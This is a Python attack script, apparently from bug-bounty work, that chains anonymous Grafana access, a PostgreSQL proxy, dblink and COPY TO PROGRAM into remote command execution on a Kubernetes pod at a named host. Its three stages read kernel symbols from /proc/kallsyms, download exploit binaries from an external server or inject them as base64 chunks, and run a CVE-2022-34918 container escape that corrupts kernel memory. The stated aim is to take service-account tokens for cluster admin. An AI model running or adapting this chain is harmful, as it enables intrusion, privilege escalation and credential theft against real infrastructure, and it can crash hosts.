#!/usr/bin/env python3
"""
CVE-2022-34918 Container Escape Delivery Chain
Bifrost stats.bifrost.io → Grafana → PostgreSQL → dblink → K8s Pod → Container Escape

Attack flow:
  1. Extract MODPROBE_PATH_BASE from /proc/kallsyms via SQL RCE
  2. Download exploit binaries to the pod
  3. Execute exploit with correct kernel offset
  4. Post-escape payload extracts K8s SA tokens → cluster admin

Requirements:
  - Network access to stats.bifrost.io
  - Grafana anonymous access (proven)
  - PostgreSQL datasource proxy (proven)
  - dblink to K8s pod (proven)
"""

import requests
import json
import sys
import time
import os
import base64
import http.server
import threading

# ============================================================
# CONFIGURATION
# ============================================================
GRAFANA_URL = "https://stats.bifrost.io"
GRAFANA_DS_UID = "P79512BAAD8EF5D24"

# K8s pod connection (via dblink from Docker host PG)
K8S_DBLINK = "host=172.19.0.35 port=31222 user=postgres password=postgres dbname=postgres"

# Binary hosting - set to where you'll host the files
# Option 1: Your own server
BINARY_HOST_URL = "http://YOUR_SERVER:8888"
# Option 2: Use Perl to write binaries via base64 chunks (slower but no external hosting)

# Target pod info
POD_WORKDIR = "/tmp/.x"

# ============================================================
# GRAFANA SQL EXECUTION
# ============================================================
def execute_sql(sql, raw_sql=False):
    """Execute SQL via Grafana datasource proxy"""
    payload = {
        "queries": [{
            "refId": "A",
            "datasource": {"type": "grafana-postgresql-datasource", "uid": GRAFANA_DS_UID},
            "rawSql": sql,
            "format": "table"
        }]
    }
    
    headers = {"Content-Type": "application/json"}
    r = requests.post(
        f"{GRAFANA_URL}/api/ds/query",
        json=payload,
        headers=headers,
        timeout=60
    )
    return r.json()

def execute_on_pod(cmd, read_output=True):
    """Execute a shell command on the K8s pod via dblink + COPY TO PROGRAM"""
    
    if read_output:
        # Write output to file, then read it back via dblink query
        escaped_cmd = cmd.replace("'", "''").replace("\\", "\\\\")
        sql = f"""
        SELECT dblink('{K8S_DBLINK}',
            $$COPY (SELECT 1) TO PROGRAM '{escaped_cmd} > {POD_WORKDIR}/cmd_out.txt 2>&1'$$
        );
        """
        execute_sql(sql)
        time.sleep(1)
        
        # Read output back
        read_sql = f"""
        SELECT * FROM dblink('{K8S_DBLINK}',
            $$SELECT pg_read_file('{POD_WORKDIR}/cmd_out.txt')$$
        ) AS t(output text);
        """
        result = execute_sql(read_sql)
        try:
            return result['results']['A']['frames'][0]['data']['values'][0][0]
        except (KeyError, IndexError):
            return str(result)
    else:
        escaped_cmd = cmd.replace("'", "''").replace("\\", "\\\\")
        sql = f"""
        SELECT dblink('{K8S_DBLINK}',
            $$COPY (SELECT 1) TO PROGRAM '{escaped_cmd}'$$
        );
        """
        return execute_sql(sql)

# ============================================================
# STAGE 1: KERNEL RECONNAISSANCE
# ============================================================
def stage1_extract_offset():
    """Extract MODPROBE_PATH_BASE from target's /proc/kallsyms"""
    print("\n[+] STAGE 1: Extracting kernel symbols...")
    
    # Create workdir
    execute_on_pod(f"mkdir -p {POD_WORKDIR}", read_output=False)
    
    # Extract key symbols
    output = execute_on_pod(
        "grep -wE '(T _text|T startup_64|[Dd] modprobe_path)' /proc/kallsyms"
    )
    print(f"    kallsyms output:\n{output}")
    
    # Parse addresses
    kbase = None
    modprobe = None
    for line in output.strip().split('\n'):
        parts = line.split()
        if len(parts) >= 3:
            addr = int(parts[0], 16)
            name = parts[2]
            if name == '_text' or name == 'startup_64':
                kbase = addr
            elif name == 'modprobe_path':
                modprobe = addr
    
    if not kbase or not modprobe:
        print("[-] FAILED: Could not extract kernel symbols")
        sys.exit(1)
    
    offset = modprobe - kbase
    print(f"    Kernel base:           0x{kbase:x}")
    print(f"    modprobe_path:         0x{modprobe:x}")
    print(f"    MODPROBE_PATH_BASE:    0x{offset:x}")
    
    return hex(offset)

# ============================================================
# STAGE 2: BINARY DELIVERY
# ============================================================
def stage2_deliver_binaries(binary_url=None):
    """Download exploit binaries to the K8s pod"""
    print("\n[+] STAGE 2: Delivering exploit binaries...")
    
    if binary_url:
        # Method 1: Download from HTTP server
        print(f"    Downloading from {binary_url}...")
        
        # Download poc
        output = execute_on_pod(
            f"perl -e 'use HTTP::Tiny; "
            f"my $r = HTTP::Tiny->new->get(\"{binary_url}/poc\"); "
            f"open(F,\">\",\"{POD_WORKDIR}/poc\"); "
            f"binmode F; print F $r->{{content}}; close F; "
            f"chmod 0755, \"{POD_WORKDIR}/poc\"; "
            f"print length($r->{{content}}).\" bytes written\\n\"'"
        )
        print(f"    poc: {output.strip()}")
        
        # Download get_root
        output = execute_on_pod(
            f"perl -e 'use HTTP::Tiny; "
            f"my $r = HTTP::Tiny->new->get(\"{binary_url}/get_root\"); "
            f"open(F,\">\",\"{POD_WORKDIR}/get_root\"); "
            f"binmode F; print F $r->{{content}}; close F; "
            f"chmod 0755, \"{POD_WORKDIR}/get_root\"; "
            f"print length($r->{{content}}).\" bytes written\\n\"'"
        )
        print(f"    get_root: {output.strip()}")
    else:
        # Method 2: Base64 encode and write via Perl (no external hosting needed)
        print("    Using base64 inline delivery (no external server)...")
        deliver_binary_base64(
            "/home/cpk/bifrost-bounty/exploit/nf_escape/poc",
            f"{POD_WORKDIR}/poc"
        )
        deliver_binary_base64(
            "/home/cpk/bifrost-bounty/exploit/nf_escape/get_root",
            f"{POD_WORKDIR}/get_root"
        )
    
    # Verify delivery
    output = execute_on_pod(f"ls -la {POD_WORKDIR}/poc {POD_WORKDIR}/get_root && file {POD_WORKDIR}/poc")
    print(f"    Verification:\n{output}")

def deliver_binary_base64(local_path, remote_path, chunk_size=48000):
    """Deliver a binary file via base64-encoded chunks through SQL"""
    with open(local_path, 'rb') as f:
        data = f.read()
    
    b64 = base64.b64encode(data).decode()
    total_chunks = (len(b64) + chunk_size - 1) // chunk_size
    
    print(f"    Delivering {os.path.basename(local_path)} ({len(data)} bytes, {total_chunks} chunks)...")
    
    # Write base64 chunks
    for i in range(total_chunks):
        chunk = b64[i * chunk_size:(i + 1) * chunk_size]
        mode = ">" if i == 0 else ">>"
        execute_on_pod(
            f"echo '{chunk}' {mode} {remote_path}.b64",
            read_output=False
        )
    
    # Decode and set permissions
    execute_on_pod(
        f"perl -MMIME::Base64 -e '"
        f"open(I,\"<\",\"{remote_path}.b64\"); "
        f"my $b64=join(\"\",<I>); close I; "
        f"$b64=~s/\\s//g; "
        f"open(O,\">\",\"{remote_path}\"); "
        f"binmode O; print O decode_base64($b64); close O; "
        f"chmod 0755, \"{remote_path}\"; "
        f"print -s \"{remote_path}\"; print \" bytes\\n\"'",
        read_output=False
    )

# ============================================================
# STAGE 3: EXPLOIT EXECUTION
# ============================================================
def stage3_execute(offset):
    """Execute the container escape exploit"""
    print(f"\n[+] STAGE 3: Executing container escape (offset={offset})...")
    print("    WARNING: This triggers kernel heap corruption.")
    print("    The node may become unstable.")
    
    # Execute the exploit
    output = execute_on_pod(
        f"cd {POD_WORKDIR} && timeout 60 ./poc {offset} 2>&1 || true"
    )
    print(f"    Exploit output:\n{output}")
    
    # Check if escape succeeded
    time.sleep(3)
    output = execute_on_pod(
        f"cat {POD_WORKDIR}/_HOST_ROOT_PROOF.txt 2>/dev/null || "
        f"cat /var/lib/postgresql/data/_HOST_ROOT_PROOF.txt 2>/dev/null || "
        f"echo 'No proof file found yet'"
    )
    print(f"\n    Post-escape proof:\n{output}")

# ============================================================
# MAIN
# ============================================================
def main():
    print("=" * 60)
    print("  CVE-2022-34918 Container Escape — Bifrost K8s")
    print("  Target: evm-db pod on 172.19.0.35:31222")
    print("  Chain: Grafana → SQL → dblink → COPY TO PROGRAM")
    print("=" * 60)
    
    if "--recon-only" in sys.argv:
        offset = stage1_extract_offset()
        print(f"\n[+] Offset extracted: {offset}")
        print(f"[+] To compile with this offset:")
        print(f"    sed -i 's/MODPROBE_PATH_BASE = .*/MODPROBE_PATH_BASE = {offset};/' src/main.c")
        return
    
    if "--deliver-only" in sys.argv:
        url = sys.argv[sys.argv.index("--deliver-only") + 1] if len(sys.argv) > sys.argv.index("--deliver-only") + 1 else None
        stage2_deliver_binaries(url)
        return
    
    if "--full" in sys.argv:
        offset = stage1_extract_offset()
        
        url = None
        for i, arg in enumerate(sys.argv):
            if arg == "--url":
                url = sys.argv[i + 1]
        
        stage2_deliver_binaries(url)
        stage3_execute(offset)
        return
    
    print("\nUsage:")
    print(f"  {sys.argv[0]} --recon-only           Extract kernel offset only")
    print(f"  {sys.argv[0]} --deliver-only [URL]    Deploy binaries to pod")
    print(f"  {sys.argv[0]} --full [--url URL]      Full chain: recon → deliver → exploit")
    print()
    print("Configuration is set for stats.bifrost.io. Update GRAFANA_URL/K8S_DBLINK if target changes.")

if __name__ == "__main__":
    main()
